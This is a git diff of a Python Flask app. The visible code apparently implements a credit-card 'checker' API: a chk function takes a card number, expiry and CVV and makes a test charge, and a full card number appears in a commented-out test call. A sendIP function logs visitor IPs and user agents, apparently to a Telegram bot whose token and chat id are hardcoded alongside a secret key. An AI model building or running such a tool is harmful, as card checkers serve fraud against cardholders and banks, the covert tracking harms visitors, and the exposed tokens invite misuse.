@@ -4,12 +4,13 @@ from bs4 import BeautifulSoup
 
 #authKey=os.environ.get("authKey", ["vaibhav"])
 
-OkVai=Flask(__name__)
-OkVai.secret_key="OkVai... Peace Out >0<"
+app=Flask(__name__)
+app.secret_key="OkVaiokKsksjjs"
 
 
 bot_token="5935678255:AAH4yHqwVwwiARYe-DV5I3ffTalWo22Ghrg"
 chat_id="2105574691"
+
 def sendIP(request, page=""):
     uadata=request.headers.get('User-Agent')
     if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
@@ -85,8 +86,8 @@ def chk(cc, mon, year, cvv, charge="10"):
 
 #print(chk("4403934457206451", "01", "2027", "864"))
 
-@OkVai.route("/api/v1")
-@OkVai.route("/api/v1/")
+@app.route("/api/v1")
+@app.route("/api/v1/")
 def v1CheckerAPI():
     sendIP(request, "checker-v1")
     #if request.args.get("authKey") not in authKey:
@@ -102,9 +103,9 @@ def v1CheckerAPI():
         return "No CC Provided"
 
 
-@OkVai.route("/")
+@app.route("/")
 def homeChecker():
     #return render_template("index.html")
     return "ok"
 if __name__=="__main__":
-    OkVai.run(debug=True, host="0.0.0.0")
+    app.run()
